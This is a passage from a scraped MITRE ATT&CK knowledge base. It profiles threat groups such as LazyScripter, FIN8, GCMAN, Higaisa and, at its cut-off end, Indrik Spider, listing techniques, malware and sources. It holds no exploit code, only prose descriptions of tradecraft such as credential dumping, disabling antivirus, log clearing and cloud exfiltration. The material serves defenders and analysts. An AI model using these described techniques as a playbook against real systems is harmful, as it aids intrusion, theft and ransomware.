.001 Virtualization/Sandbox Evasion: System Checks Windshift has deployed anti-analysis capabilities during their Operation BULL campaign.[4] Software ID Name References Techniques S0466 WindTail [1][2][3] Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Automated Collection, Command and Scripting Interpreter: Unix Shell, Deobfuscate/Decode Files or Information, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, File and Directory Discovery, Hide Artifacts: Hidden Window, Indicator Removal: File Deletion, Masquerading: Invalid Code Signature, Masquerading, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compression, System Time Discovery References Karim, T. (2018, August). TRAILS OF WINDSHIFT. Retrieved November 17, 2024. Wardle, Patrick. (2018, December 20). Middle East Cyber-Espionage analyzing WindShift's implant: OSX.WindTail (part 1). Retrieved October 3, 2019. Wardle, Patrick. (2019, January 15). Middle East Cyber-Espionage analyzing WindShift's implant: OSX.WindTail (part 2). Retrieved October 3, 2019. The BlackBerry Research & Intelligence Team. (2020, October). BAHAMUT: Hack-for-Hire Masters of Phishing, Fake News, and Fake Apps. Retrieved February 8, 2021. Cyfirma. (2023, February 10). APT Bahamut Attacks Indian Intelligence Operative using Android Malware. Retrieved February 23, 2024. "
},
{
"id": 88,
"title": "LazyScripter, Group G0140",
"path": "/groups/G0140/index.html",
"content": " LazyScripter LazyScripter is threat group that has mainly targeted the airlines industry since at least 2018, primarily using open-source toolsets.[1] ID: G0140 Contributors: Manikantan Srinivasan, NEC Corporation India; Pooja Natarajan, NEC Corporation India; Hiroki Nagahama, NEC Corporation Version: 1.1 Created: 24 November 2021 Last Modified: 17 November 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1583 .001 Acquire Infrastructure: Domains LazyScripter has used dynamic DNS providers to create legitimate-looking subdomains for C2.[1] .006 Acquire Infrastructure: Web Services LazyScripter has established GitHub accounts to host its toolsets.[1] Enterprise T1071 .004 Application Layer Protocol: DNS LazyScripter has leveraged dynamic DNS providers for C2 communications.[1] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder LazyScripter has achieved persistence via writing a PowerShell script to the autorun registry key.[1] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell LazyScripter has used PowerShell scripts to execute malicious code.[1] .003 Command and Scripting Interpreter: Windows Command Shell LazyScripter has used batch files to deploy open-source and multi-stage RATs.[1] .005 Command and Scripting Interpreter: Visual Basic LazyScripter has used VBScript to execute malicious code.[1] .007 Command and Scripting Interpreter: JavaScript LazyScripter has used JavaScript in its attacks.[1] Enterprise T1105 Ingress Tool Transfer LazyScripter had downloaded additional tools to a compromised host.[1] Enterprise T1036 Masquerading LazyScripter has used several different security software icons to disguise executables.[1] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation LazyScripter has leveraged the BatchEncryption tool to perform advanced batch script obfuscation and encoding techniques.[1] Enterprise T1588 .001 Obtain Capabilities: Malware LazyScripter has used a variety of open-source remote access Trojans for its operations.[1] Enterprise T1566 .001 Phishing: Spearphishing Attachment LazyScripter has used spam emails weaponized with archive or document files as its initial infection vector.[1] .002 Phishing: Spearphishing Link LazyScripter has used spam emails that contain a link that redirects the victim to download a malicious document.[1] Enterprise T1608 .001 Stage Capabilities: Upload Malware LazyScripter has hosted open-source remote access Trojans used in its operations in GitHub.[1] Enterprise T1218 .005 System Binary Proxy Execution: Mshta LazyScripter has used mshta.exe to execute Koadic stagers.[1] .011 System Binary Proxy Execution: Rundll32 LazyScripter has used rundll32.exe to execute Koadic stagers.[1] Enterprise T1204 .001 User Execution: Malicious Link LazyScripter has relied upon users clicking on links to malicious files.[1] .002 User Execution: Malicious File LazyScripter has lured users to open malicious email attachments.[1] Enterprise T1102 Web Service LazyScripter has used GitHub to host its payloads to operate spam campaigns.[1] Software ID Name References Techniques S0363 Empire [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0250 Koadic [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel: Asymmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Network Service Discovery, Network Share Discovery, OS Credential Dumping: Security Account Manager, OS Credential Dumping: NTDS, Process Injection: Dynamic-link Library Injection, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, System Binary Proxy Execution: Mshta, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Services: Service Execution, Windows Management Instrumentation S0669 KOCTOPUS [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Visual Basic, Deobfuscate/Decode Files or Information, Hide Artifacts: Hidden Window, Impair Defenses: Disable or Modify Tools, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Obfuscated Files or Information: Command Obfuscation, Phishing: Spearphishing Attachment, Phishing: Spearphishing Link, Proxy, System Information Discovery, User Execution: Malicious File, User Execution: Malicious Link S0508 ngrok [1] Dynamic Resolution: Domain Generation Algorithms, Exfiltration Over Web Service, Protocol Tunneling, Proxy, Web Service S0385 njRAT [1] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compile After Delivery, Peripheral Device Discovery, Process Discovery, Query Registry, Remote Services: Remote Desktop Protocol, Remote System Discovery, Replication Through Removable Media, Screen Capture, System Information Discovery, System Owner/User Discovery, Video Capture S0262 QuasarRAT [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores, Data from Local System, Encrypted Channel: Symmetric Cryptography, Hide Artifacts: Hidden Window, Hide Artifacts: Hidden Files and Directories, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Non-Application Layer Protocol, Non-Standard Port, Proxy, Remote Services: Remote Desktop Protocol, Scheduled Task/Job: Scheduled Task, Subvert Trust Controls: Code Signing, System Information Discovery, System Location Discovery, System Network Configuration Discovery, System Owner/User Discovery, Unsecured Credentials: Credentials In Files, Video Capture S0332 Remcos [1] Abuse Elevation Control Mechanism: Bypass User Account Control, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Clipboard Data, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, File and Directory Discovery, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Obfuscated Files or Information, Process Injection, Proxy, Screen Capture, Video Capture, Virtualization/Sandbox Evasion: System Checks References Jazi, H. (2021, February). LazyScripter: From Empire to double RAT. Retrieved November 17, 2024. "
},
{
"id": 89,
"title": "FIN8, Syssphinx, Group G0061",
"path": "/groups/G0061/index.html",
"content": " FIN8 FIN8 is a financially motivated threat group that has been active since at least January 2016, and known for targeting organizations in the hospitality, retail, entertainment, insurance, technology, chemical, and financial sectors. In June 2021, security researchers detected FIN8 switching from targeting point-of-sale (POS) devices to distributing a number of ransomware variants.[1][2][3][4] ID: G0061 \u24d8 Associated Groups: Syssphinx Contributors: Daniyal Naeem, BT Security; Serhii Melnyk, Trustwave SpiderLabs Version: 2.0 Created: 18 April 2018 Last Modified: 16 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Syssphinx [4] Techniques Used Domain ID Name Use Enterprise T1134 .001 Access Token Manipulation: Token Impersonation/Theft FIN8 has used a malicious framework designed to impersonate the lsass.exe/vmtoolsd.exe token.[5][4] Enterprise T1071 .001 Application Layer Protocol: Web Protocols FIN8 has used HTTPS for command and control.[5] Enterprise T1560 .001 Archive Collected Data: Archive via Utility FIN8 has used RAR to compress collected data before exfiltration.[6] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell FIN8's malicious spearphishing payloads are executed as PowerShell. FIN8 has also used PowerShell for lateral movement and credential access.[1][5][6][4] .003 Command and Scripting Interpreter: Windows Command Shell FIN8 has used a Batch file to automate frequently executed post compromise cleanup activities.[6] FIN8 has also executed commands remotely via cmd.exe.[1][5][4] Enterprise T1486 Data Encrypted for Impact FIN8 has deployed ransomware such as Ragnar Locker, White Rabbit, and attempted to execute Noberus on compromised networks.[4] Enterprise T1074 .002 Data Staged: Remote Data Staging FIN8 aggregates staged data from a network into a single location.[6] Enterprise T1482 Domain Trust Discovery FIN8 has retrieved a list of trusted domains by using nltest.exe /domain_trusts.[5] Enterprise T1573 .002 Encrypted Channel: Asymmetric Cryptography FIN8 has used the Plink utility to tunnel RDP back to C2 infrastructure.[6] Enterprise T1546 .003 Event Triggered Execution: Windows Management Instrumentation Event Subscription FIN8 has used WMI event subscriptions for persistence.[5] Enterprise T1048 .003 Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol FIN8 has used FTP to exfiltrate collected data.[6] Enterprise T1068 Exploitation for Privilege Escalation FIN8 has exploited the CVE-2016-0167 local vulnerability.[2][6] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs FIN8 has cleared logs during post compromise cleanup activities.[6] .004 Indicator Removal: File Deletion FIN8 has deleted tmp and prefetch files during post compromise cleanup activities. FIN8 has also deleted PowerShell scripts to evade detection on compromised machines.[6][4] Enterprise T1105 Ingress Tool Transfer FIN8 has used remote code execution to download subsequent payloads.[2][5] Enterprise T1112 Modify Registry FIN8 has deleted Registry keys during post compromise cleanup activities.[6] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation FIN8 has used environment variables and standard input (stdin) to obfuscate command-line arguments. FIN8 also obfuscates malicious macros delivered as payloads.[1][6][5] Enterprise T1588 .002 Obtain Capabilities: Tool FIN8 has used open-source tools such as Impacket for targeting efforts.[3] .003 Obtain Capabilities: Code Signing Certificates FIN8 has used an expired open-source X.509 certificate for testing in the OpenSSL repository, to connect to actor-controlled C2 servers.[3] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory FIN8 harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).[6] Enterprise T1566 .001 Phishing: Spearphishing Attachment FIN8 has distributed targeted emails containing Word documents with embedded malicious macros.[1][2][6] .002 Phishing: Spearphishing Link FIN8 has distributed targeted emails containing links to malicious documents with embedded macros.[6] Enterprise T1055 .004 Process Injection: Asynchronous Procedure Call FIN8 has injected malicious code into a new svchost.exe process.[5] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol FIN8 has used RDP for lateral movement.[6] .002 Remote Services: SMB/Windows Admin Shares FIN8 has attempted to map to C$ on enumerated hosts to test the scope of their current credentials/context. FIN8 has also used smbexec from the Impacket suite for lateral movement.[6][3] Enterprise T1018 Remote System Discovery FIN8 has used dsquery and other Active Directory utilities to enumerate hosts; they have also used nltest.exe /dclist to retrieve a list of domain controllers.[6][5] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task FIN8 has used scheduled tasks to maintain RDP backdoors.[6] Enterprise T1518 .001 Software Discovery: Security Software Discovery FIN8 has used Registry keys to detect and avoid executing in potential sandboxes.[6] Enterprise T1082 System Information Discovery FIN8 has used PowerShell Scripts to check the architecture of a compromised machine before the selection of a 32-bit or 64-bit version of a malicious .NET loader.[4] Enterprise T1016 .001 System Network Configuration Discovery: Internet Connection Discovery FIN8 has used the Ping command to check connectivity to actor-controlled C2 servers.[3] Enterprise T1033 System Owner/User Discovery FIN8 has executed the command quser to display the session details of a compromised machine.[4] Enterprise T1204 .001 User Execution: Malicious Link FIN8 has used emails with malicious links to lure victims into installing malware.[1][2][6] .002 User Execution: Malicious File FIN8 has used malicious e-mail attachments to lure victims into executing malware.[1][2][6] Enterprise T1078 Valid Accounts FIN8 has used valid accounts for persistence and lateral movement.[6] Enterprise T1102 Web Service FIN8 has used sslip.io, a free IP to domain mapping service that also makes SSL certificate generation easier for traffic encryption, as part of their command and control.[5] Enterprise T1047 Windows Management Instrumentation FIN8's malicious spearphishing payloads use WMI to launch malware and spawn cmd.exe execution. FIN8 has also used WMIC and the Impacket suite for lateral movement, as well as during and post compromise cleanup activities.[1][5][6][4] Software ID Name References Techniques S1081 BADHATCH [7] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Token Impersonation/Theft, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Domain Trust Discovery, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Exfiltration Over C2 Channel, Indicator Removal: File Deletion, Ingress Tool Transfer, Native API, Network Service Discovery, Network Share Discovery, Obfuscated Files or Information: Embedded Payloads, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information: Compression, Permission Groups Discovery: Domain Groups, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Process Injection: Asynchronous Procedure Call, Proxy, Reflective Code Loading, Remote System Discovery, Scheduled Task/Job: Scheduled Task, Screen Capture, System Information Discovery, System Network Connections Discovery, System Owner/User Discovery, System Time Discovery, Use Alternate Authentication Material: Pass the Hash, Web Service, Windows Management Instrumentation S0105 dsquery [6] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, System Information Discovery S0357 Impacket [5][3] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0039 Net [6] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0359 Nltest [5] Domain Trust Discovery, Remote System Discovery, System Network Configuration Discovery S0097 Ping [3] Remote System Discovery S0029 PsExec [4] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0196 PUNCHBUGGY [2] Account Discovery: Local Account, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: PowerShell, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Event Triggered Execution: AppCert DLLs, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information, Shared Modules, Software Discovery: Security Software Discovery, System Binary Proxy Execution: Rundll32, System Information Discovery S0197 PUNCHTRACK [2] Data from Local System, Data Staged: Local Data Staging, Obfuscated Files or Information S0481 Ragnar Locker [4] Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encrypted for Impact, Hide Artifacts: Run Virtual Instance, Impair Defenses: Disable or Modify Tools, Inhibit System Recovery, Peripheral Device Discovery, Service Stop, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: Rundll32, System Location Discovery, System Services: Service Execution S1085 Sardonic [3][4] Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Windows Management Instrumentation Event Subscription, Indicator Removal, Ingress Tool Transfer, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information: Command Obfuscation, Obfuscated Files or Information, Process Discovery, Process Injection: Asynchronous Procedure Call, Reflective Code Loading, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, Windows Management Instrumentation References Bohannon, D. & Carr N. (2017, June 30). Obfuscation in the Wild: Targeted Attackers Lead the Way in Evasion Techniques. Retrieved February 12, 2018. Kizhakkinan, D., et al. (2016, May 11). Threat Actor Leverages Windows Zero-day Exploit in Payment Card Data Attacks. Retrieved February 12, 2018. Budaca, E., et al. (2021, August 25). FIN8 Threat Actor Goes Agile with New Sardonic Backdoor. Retrieved August 9, 2023. Symantec Threat Hunter Team. (2023, July 18). FIN8 Uses Revamped Sardonic Backdoor to Deliver Noberus Ransomware. Retrieved August 9, 2023. Martin Zugec. (2021, July 27). Deep Dive Into a FIN8 Attack - A Forensic Investigation. Retrieved September 1, 2021. Elovitz, S. & Ahl, I. (2016, August 18). Know Your Enemy: New Financially-Motivated & Spear-Phishing Group. Retrieved February 26, 2018. Vrabie, V., et al. (2021, March 10). FIN8 Returns with Improved BADHATCH Toolkit. Retrieved September 8, 2021. "
},
{
"id": 90,
"title": "GCMAN, Group G0036",
"path": "/groups/G0036/index.html",
"content": " GCMAN GCMAN is a threat group that focuses on targeting banks for the purpose of transferring money to e-currency services. [1] ID: G0036 Version: 1.1 Created: 31 May 2017 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1021 .004 Remote Services: SSH GCMAN uses Putty for lateral movement.[1] .005 Remote Services: VNC GCMAN uses VNC for lateral movement.[1] References Kaspersky Lab's Global Research & Analysis Team. (2016, February 8). APT-style bank robberies increase with Metel, GCMAN and Carbanak 2.0 attacks. Retrieved April 20, 2016. "
},
{
"id": 91,
"title": "Higaisa, Group G0126",
"path": "/groups/G0126/index.html",
"content": " Higaisa Higaisa is a threat group suspected to have South Korean origins. Higaisa has targeted government, public, and trade organizations in North Korea; however, they have also carried out attacks in China, Japan, Russia, Poland, and other nations. Higaisa was first disclosed in early 2019 but is assessed to have operated as early as 2009.[1][2][3] ID: G0126 Contributors: Daniyal Naeem, BT Security Version: 1.1 Created: 05 March 2021 Last Modified: 11 April 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1071 .001 Application Layer Protocol: Web Protocols Higaisa used HTTP and HTTPS to send data back to its C2 server.[1][2] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Higaisa added a spoofed binary to the start-up folder for persistence.[1][2] Enterprise T1059 .003 Command and Scripting Interpreter: Windows Command Shell Higaisa used cmd.exe for execution.[1][2][3] .005 Command and Scripting Interpreter: Visual Basic Higaisa has used VBScript code on the victim's machine.[3] .007 Command and Scripting Interpreter: JavaScript Higaisa used JavaScript to execute additional files.[1][2][3] Enterprise T1001 .003 Data Obfuscation: Protocol or Service Impersonation Higaisa used a FakeTLS session for C2 communications.[2] Enterprise T1140 Deobfuscate/Decode Files or Information Higaisa used certutil to decode Base64 binaries at runtime and a 16-byte XOR key to decrypt data.[1][2] Enterprise T1573 .001 Encrypted Channel: Symmetric Cryptography Higaisa used AES-128 to encrypt C2 traffic.[2] Enterprise T1041 Exfiltration Over C2 Channel Higaisa exfiltrated data over its C2 channel.[2] Enterprise T1203 Exploitation for Client Execution Higaisa has exploited CVE-2018-0798 for execution.[3] Enterprise T1564 .003 Hide Artifacts: Hidden Window Higaisa used a payload that creates a hidden window.[3] Enterprise T1574 .001 Hijack Execution Flow: DLL Higaisa\u2019s JavaScript file used a legitimate Microsoft Office 2007 package to side-load the OINFO12.OCX dynamic link library.[3] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Higaisa named a shellcode loader binary svchast.exe to spoof the legitimate svchost.exe.[1][2] Enterprise T1106 Native API Higaisa has called various native OS APIs.[2] Enterprise T1027 .001 Obfuscated Files or Information: Binary Padding Higaisa performed padding with null bytes before calculating its hash.[2] .013 Obfuscated Files or Information: Encrypted/Encoded File Higaisa used Base64 encoded compressed payloads.[1][2] .015 Obfuscated Files or Information: Compression Higaisa used Base64 encoded compressed payloads.[1][2] Enterprise T1566 .001 Phishing: Spearphishing Attachment Higaisa has sent spearphishing emails containing malicious attachments.[1][2] Enterprise T1057 Process Discovery Higaisa\u2019s shellcode attempted to find the process ID of the current process.[2] Enterprise T1090 .001 Proxy: Internal Proxy Higaisa discovered system proxy settings and used them if available.[2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Higaisa dropped and added officeupdate.exe to scheduled tasks.[1][2] Enterprise T1029 Scheduled Transfer Higaisa sent the victim computer identifier in a User-Agent string back to the C2 server every 10 minutes.[3] Enterprise T1082 System Information Discovery Higaisa collected the system volume serial number, GUID, and computer name.[3][1] Enterprise T1016 System Network Configuration Discovery Higaisa used ipconfig to gather network configuration information.[1][2] Enterprise T1124 System Time Discovery Higaisa used a function to gather the current time.[2] Enterprise T1204 .002 User Execution: Malicious File Higaisa used malicious e-mail attachments to lure victims into executing LNK files.[1][2] Enterprise T1220 XSL Script Processing Higaisa used an XSL file to run VBScript code.[3] Software ID Name References Techniques S0160 certutil [1][3] Archive Collected Data: Archive via Utility, Deobfuscate/Decode Files or Information, Ingress Tool Transfer, Subvert Trust Controls: Install Root Certificate S0032 gh0st RAT [1] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0013 PlugX [1] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver References Malwarebytes Threat Intelligence Team. (2020, June 4). New LNK attack tied to Higaisa APT discovered. Retrieved March 2, 2021. Singh, S. Singh, A. (2020, June 11). The Return on the Higaisa APT. Retrieved March 2, 2021. PT ESC Threat Intelligence. (2020, June 4). COVID-19 and New Year greetings: an investigation into the tools and methods used by the Higaisa group. Retrieved March 2, 2021. "
},
{
"id": 92,
"title": "Indrik Spider, Evil Corp, Manatee Tempest, DEV-0243, UNC2165, Group G0119",
"path": "/groups/G0119/index.html",
"content": " Indrik Spider Indrik Spider is a Russia-based cybercriminal group that has been active since at least 2014. Indrik Spider initially started with the Dridex banking Trojan, and then by 2017 they began running ransomware operations using BitPaymer, WastedLocker, and Hades ransomware. Following U.S. sanctions and an indictment in 2019, Indrik Spider changed their tactics and diversified their toolset.[1][2][3] ID: G0119 \u24d8 Associated Groups: Evil Corp, Manatee Tempest, DEV-0243, UNC2165 Contributors: Jennifer Kim Roman, CrowdStrike; Liran Ravich, CardinalOps Version: 4.1 Created: 06 January 2021 Last Modified: 28 October 2024 Version Permalink Live Version Associated Group Descriptions Name Description Evil Corp [2][3] Manatee Tempest [4] DEV-0243 [4] UNC2165 [5] Techniques Used Domain ID Name Use Enterprise T1583 Acquire Infrastructure Indrik Spider has purchased access to victim VPNs to facilitate access to victim environments.[5] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Indrik Spider has used PowerShell Empire for execution of malware.[1][6] .003 Command and Scripting Interpreter: Windows Command Shell Indrik Spider has used batch scripts on victim's machines.[1][5] .007 Command and Scripting Interpreter: JavaScript Indrik Spider has used malicious JavaScript files for several components of their attack.[6] Enterprise T1584 .004 Compromise Infrastructure: Server Indrik Spider has served fake updates via legitimate websites that have been compromised.[1] Enterprise T1136 Create Account Indrik Spider used wmic.exe to add a new user to the system.[6] .001 Local Account Indrik Spider has created local system accounts and has added the accounts to privileged groups.[5] Enterprise T1555 .005 Credentials from Password Stores: Password Managers Indrik Spider has accessed and exported passwords from password managers.[5] Enterprise T1486 Data Encrypted for Impact Indrik Spider has encrypted domain-controlled systems using BitPaymer.[1] Additionally, Indrik Spider used PsExec to execute a ransomware script.[5] Enterprise T1074 .001 Data Staged: Local Data Staging Indrik Spider has stored collected data in a .tmp file.[6] Enterprise T1587 .001 Develop Capabilities: Malware Indrik Spider has developed malware for their operations, including ransomware such as BitPaymer and WastedLocker.[1] Enterprise T1484 .001 Domain or Tenant Policy Modification: Group Policy Modification Indrik Spider has used Group Policy Objects to deploy batch scripts.[1][5] Enterprise T1585 .002 Establish Accounts: Email Accounts Indrik Spider has created email accounts to communicate with their ransomware victims, to include providing payment and decryption details.[1] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Indrik Spider has exfiltrated data using Rclone or MEGASync prior to deploying ransomware.[5] Enterprise T1590 Gather Victim Network Information Indrik Spider has downloaded tools, such as the Advanced Port Scanner utility and Lansweeper, to conduct internal reconnaissance of the victim network. Indrik Spider has also accessed the victim\u2019s VMware VCenter, which had information about host configuration, clusters, etc.[5] Enterprise T1562 .001 Impair Defenses: Disable or Modify Tools Indrik Spider used PsExec to leverage Windows Defender to disable scanning of all downloaded files and to restrict real-time monitoring.[6] Indrik Spider has used MpCmdRun to revert the definitions in Microsoft Defender.[5] Additionally, Indrik Spider has used WMI to stop or uninstall and reset anti-virus products and other defensive services.[5] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs Indrik Spider has used Cobalt Strike to empty log files.[6] Additionally, Indrik Spider has cleared all event logs using wevutil.[5] Enterprise T1105 Ingress Tool Transfer Indrik Spider has downloaded additional scripts, malware, and tools onto a compromised host.[1][6][5] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Indrik Spider used fake updates for FlashPlayer plugin and Google Chrome as initial infection vectors.[1] Enterprise T1112 Modify Registry Indrik Spider has modified registry keys to prepare for ransomware execution and to disable common administrative utilities.[5] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Indrik Spider used Cobalt Strike to carry out credential 